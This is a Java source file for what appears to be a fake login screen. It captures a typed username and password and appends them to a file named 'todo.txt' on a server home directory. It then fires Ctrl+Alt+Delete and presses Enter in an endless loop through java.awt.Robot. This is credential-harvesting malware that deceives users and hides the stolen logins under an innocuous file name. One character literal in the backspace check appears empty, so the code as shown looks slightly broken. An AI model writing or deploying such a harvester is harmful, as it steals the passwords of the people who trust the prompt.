package code;
import java.awt.AWTException;
import java.awt.Robot;
import java.awt.event.KeyEvent;
import java.awt.event.KeyListener;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;

public class Interface implements KeyListener
{
	static String typedText = "";
	static String usn = "";
	static String pwd = "";
	static boolean möö = false;
	static Robot r;
	public Interface() throws AWTException
	{
		r = new Robot();
	}
	@Override
	public void keyTyped(KeyEvent e)
	{
		if(e.getKeyChar()=='\n')
		{
			System.out.println("enter");
			if(möö==true)
			{
				
				pwd = typedText;
				System.out.println("Username: "+usn+"\nPassword: "+pwd);
				String content = "\nUsername: "+usn+"\nPassword: "+pwd;
				String path = "/home/kfg/Home_auf_Server/todo.txt";
				
				try {
					Files.write( Paths.get(path), content.getBytes(), StandardOpenOption.APPEND);
				} catch (IOException e1) 
				{
					e1.printStackTrace();
				}
				
				try {
					Thread.sleep(1000);
				} catch (InterruptedException e2) {
					// TODO Auto-generated catch block
					e2.printStackTrace();
				}
				
				
				r.keyPress(KeyEvent.VK_CONTROL);
				r.keyPress(KeyEvent.VK_ALT);
				r.keyPress(KeyEvent.VK_DELETE);
				try {
					Thread.sleep(20);
				} catch (InterruptedException e1) {
					// TODO Auto-generated catch block
					e1.printStackTrace();
				}
				r.keyRelease(KeyEvent.VK_CONTROL);
				r.keyRelease(KeyEvent.VK_ALT);
				r.keyRelease(KeyEvent.VK_DELETE);
				while(true)
				{
					r.keyPress(KeyEvent.VK_ENTER);try {
						Thread.sleep(2);
					} catch (InterruptedException e1) {
						// TODO Auto-generated catch block
						e1.printStackTrace();
					}
					r.keyRelease(KeyEvent.VK_ENTER);try {
						Thread.sleep(2);
					} catch (InterruptedException e1) {
						// TODO Auto-generated catch block
						e1.printStackTrace();
					}
				}
				
			}else
			{
				möö = true;
				usn = typedText;
				typedText="";
			}			
		}else
		{
			if(typedText.length()==0)
			{
				typedText="";
			}
			if(e.getKeyChar()==''&&typedText.length()>=0)
			{
				typedText = typedText.substring(0, typedText.length() - 1);
			}else
			{
				typedText = typedText + e.getKeyChar();
			}
		}	
	}
	@Override
	public void keyPressed(KeyEvent e) {
		// TODO Auto-generated method stub
		
	}

	@Override
	public void keyReleased(KeyEvent e) {
		// TODO Auto-generated method stub
		
	}
}
